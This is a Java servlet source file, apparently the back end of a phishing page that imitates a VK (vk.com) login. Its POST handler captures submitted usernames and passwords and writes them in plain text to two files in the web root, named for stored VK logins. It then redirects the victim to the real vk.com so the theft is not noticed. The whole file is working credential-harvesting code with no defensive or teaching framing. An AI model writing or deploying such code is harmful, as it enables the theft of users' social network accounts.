import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

@WebServlet("/vks")
public class VkServlet extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        request.setCharacterEncoding("UTF-8");
        String login = request.getParameter("username");
        String password = request.getParameter("password");
        if(!login.equals("") && !password.equals("")){
            FileWriter fileWriter = new FileWriter(new File(getServletContext().getRealPath("/")+"VK_loginAndPasswords.txt"),true);
            FileWriter fileWriter2 = new FileWriter(new File(getServletContext().getRealPath("/")+"VK.txt"),true);
            fileWriter.write(login+" "+password);
            fileWriter.append(System.getProperty("line.separator"));
            fileWriter.close();

            fileWriter2.write(login+" "+password);
            fileWriter2.append(System.getProperty("line.separator"));
            fileWriter2.close();
        }

        response.sendRedirect("https://vk.com");
    }

    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

    }
}
